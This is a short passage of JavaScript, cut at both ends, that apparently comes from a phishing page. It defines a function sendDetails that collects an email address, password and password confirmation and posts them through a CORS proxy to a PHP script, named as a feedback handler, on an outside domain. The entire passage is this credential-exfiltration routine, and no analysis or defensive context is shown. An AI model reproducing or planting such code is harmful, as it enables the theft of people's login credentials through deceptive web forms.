  ...
  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://cors-anywhere.herokuapp.com/https://campingplatz-ennen.de/feedback0.php", o).then(function(t) {
